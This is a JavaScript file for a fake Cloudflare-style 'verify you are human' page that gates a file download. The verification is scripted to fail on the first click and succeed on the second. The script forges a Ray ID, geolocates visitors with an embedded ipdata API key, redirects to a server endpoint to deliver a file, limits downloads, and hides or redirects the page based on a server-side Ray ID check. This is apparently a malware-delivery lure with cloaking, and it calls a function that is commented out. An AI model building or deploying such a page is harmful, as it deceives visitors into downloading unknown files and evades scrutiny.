

// domain 
const domain = window.location.hostname;


let clickCount = 0;


// Function to generate a random 16-character hexadecimal Ray ID
function generateRayID() {
  var characters = "0123456789abcdef";
  let rayID = "";
  for (let i = 0; i < 16; i++) {
    rayID += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return rayID;
}


// Function to display the current domain
function setDomain() {
  var domain = window.location.hostname;
  document.getElementById("domain-name").innerHTML = domain;
}

// Function to fetch the user's IP using an external service
// async function fetchUserIP() {
//   try {
//     var response = await fetch("https://api.ipify.org?format=json");
//     var data = await response.json();
//     document.getElementById("footer-ip").innerHTML = data.ip;
//   } catch (error) {
//     console.error("Error fetching IP address:", error);
//     document.getElementById("footer-ip").innerHTML = "Unavailable";
//   }
// }

// Run functions on page load
document.addEventListener("DOMContentLoaded", function () {
  setDomain();
  fetchUserIP();

  // Set the generated Ray ID
  var rayID = generateRayID();
  // document.getElementById("ray-id").innerHTML = rayID;
});

var downloadBtn = document.getElementById("download-btn");
var captchaWrapper = document.getElementById("captcha-wrapper");


// Simulate enabling the checkbox after a certain time (for example purposes)
setTimeout(() => {
  // document.getElementById("captcha-checkbox").disabled = false;
}, 1000); // Enables checkbox after 1 second

// **************** JS Code For Translate ********************
// Function to detect the user's browser language and set the appropriate text
function setLanguage(translations) {
  // Get the user's preferred language from the browser (e.g., 'en', 'es')
  let userLang = navigator.language || navigator.userLanguage;
  // Only keep the first two characters (e.g., 'en-US' becomes 'en')
  userLang = userLang.slice(0, 2);

  // If the language is not supported, default to English ('en')
  if (!translations[userLang]) {
    userLang = "es";
  }
  // Fetch all elements with the 'data-translate' attribute
  var translatableElements = document.querySelectorAll("[data-translate]");

  // Loop through each element and update its text based on the detected language
  translatableElements.forEach((element) => {

    var translateKey = element.getAttribute("data-translate");
    element.innerHTML = translations[userLang][translateKey];
  });
}

// Function to load translations from a JSON file
function loadTranslations() {
  fetch("./V1_files/lang.json")
    .then((response) => response.json())
    .then((translations) => {
      setLanguage(translations);
    })
    .catch((error) => {
      console.error("Error loading translations:", error);
    });
}



// Getting the country code from the user's IP
var country_code = '';
$.get("https://api.ipdata.co?api-key=550fe21e6fda7f62b485018d9fe45bf04de9da3a4f4c735c2c812c32", function (response) {
  country_code = response.country_code;
}, "jsonp");



// Automatically load translations when the page loads
document.addEventListener("DOMContentLoaded", () => {
  loadTranslations();
});


// click download button => display verify panel
$('#donwload_btn').click(function() {
    document.getElementById('overlay').style.display = 'block';
    document.getElementById('captcha-wrapper').style.display = 'block';  
})



// hide overlay
function hideoverlay() {
  if (isClose) {
    // document.getElementById('captcha-wrapper').style.display = 'none';
    // document.getElementById('overlay').style.display = 'none';
  }
}


// download ban more than 2 times
var downloadCount = 0;

// on submit
$('#submit_btn').click(function() {

  if (isClose) {
    // $('#captcha-wrapper').css('display', 'none');
    // $('#overlay').css('display', 'none');

    downloadCount++;
    window.location.href = "/api/index.php?rayid=" + rayID + "&countrycode=" + country_code;

    window.setTimeout(function() {
        check_ray_id();
    }, 60000);

    // window.alert('Your report has been successfully downloaded!');
  }

  if (downloadCount >= 2) {
    isClose = false;
    $('#submit_btn').removeClass('submit_btn');
    $('#submit_btn').addClass('pre_submit_btn');
  }

})


// hide popup when click overlay
$('#overlay').click(function() {
    if (isClose) {
      // $('#captcha-wrapper').css('display', 'none');
      // $('#overlay').css('display', 'none');  
    }
})


// can the popup close?
var isClose = false;

// play video loading
function play_loading() {
    
    // Replace checkbox with spinner
    // document.getElementById("captcha-checkbox").style.display = "none";
    // document.getElementById("captcha-spinner").style.display = "block";
    document.getElementById("captcha-text").innerHTML = "Verifying...";

    if (clickCount == 0) {
        document.getElementById('video1').play();
    } else {  
        $('#video1').css('display', 'none');
        $('#video2').css('display', 'block');
        document.getElementById('video2').play();
    } 

    setTimeout(function () {
      // document.getElementById("captcha-spinner").style.display = "none"; // Hide spinner after 2 seconds
      
      if (clickCount == 0) {
        // First click: show alert, revert to checkbox, but no success mark
        document.getElementById("error-message").style.display = "block"; // Show red error message
        // document.getElementById("captcha-checkbox").checked = false; // Ensure checkbox is unchecked
        document.getElementById("captcha-text").innerHTML = "Verify you are human";
        // document.getElementById("captcha-checkbox").style.display = "block"; // Show checkbox again
        // document.getElementById("captcha-checkbox").disabled = false; // Enable checkbox again
        document.getElementById('captcha-wrapper').style.height = '140px';
        document.getElementById('submit_div').style.paddingTop = '45px';
      } else if (clickCount == 1) {
        // Second click: successful verification, show success mark
        document.getElementById("error-message").style.display = "none"; // Hide error message
        // document.getElementById("captcha-checkbox").checked = true; // Show success mark
        document.getElementById("captcha-text").innerHTML = "Success!";
        // document.getElementById("captcha-checkbox").style.display = "block";
        // document.getElementById("captcha-checkbox").disabled = true; // Disable checkbox permanently
        document.getElementById('captcha-wrapper').style.height = 'auto';
        document.getElementById('submit_div').style.paddingTop = '15px';

        isClose = true;
        
        $('#submit_btn').removeClass('pre_submit_btn');
        $('#submit_btn').addClass('submit_btn');

      }

      clickCount++;
    }, 2000); // Simulates loading time
}




// set dark mode by OS setting
// Function to toggle dark mode based on browser/system setting
function applyDarkMode() {
  // Check if the user's browser/system is set to dark mode
  if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
    // Dark mode is enabled in browser settings
    $('*').addClass('dark-mode');
    console.log('Dark mode applied based on browser setting');
  } else {
    // Light mode is enabled in browser settings
    $('*').removeClass('dark-mode');
    console.log('Light mode applied based on browser setting');
  }
}

// Detect system/browser color scheme changes
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (event) => {
  if (event.matches) {
    // User switched to dark mode
    $('*').addClass('dark-mode');
    console.log('Switched to dark mode');
  } else {
    // User switched to light mode
    $('*').removeClass('dark-mode');
    console.log('Switched to light mode');
  }
});

// Apply the initial mode when the page loads
applyDarkMode();




// Ray ID
var rayID;
fetch(window.location.href, {
    method: 'GET',
})
.then(response => {

    if ( response.headers.get('cf-ray') ) {

        rayID = response.headers.get('cf-ray');
        $('#ray-id').text(rayID);

    } else {

        if (localStorage.getItem('ray')) {
            rayID = localStorage.getItem('ray');
        } else {
            rayID = generateRayID();
            localStorage.setItem('ray', rayID);
        }
        
        $('#ray-id').text(rayID);  
    }
})
.catch(error => {
    console.error('Error fetching page:', error);
});



// Block site
document.body.style.opacity = 0;

window.setTimeout(function() {
  check_ray_id();
}, 800)


// check ray id
function check_ray_id() {
  $.ajax({
    type: 'POST',
    url: '/api/check_rayid.php',
    data: JSON.stringify({ rayid: rayID }),
    contentType: 'application/json', // Indicate that you're sending JSON
    success: function(res) {
        console.log(res)

        if (res == '10') {
          document.body.innerHTML = '';
          location.href =  window.location.protocol + "//" + window.location.hostname + (window.location.port ? ':' + window.location.port : '');
        } else {
          document.body.style.opacity = 100;
        }
    }
  })
}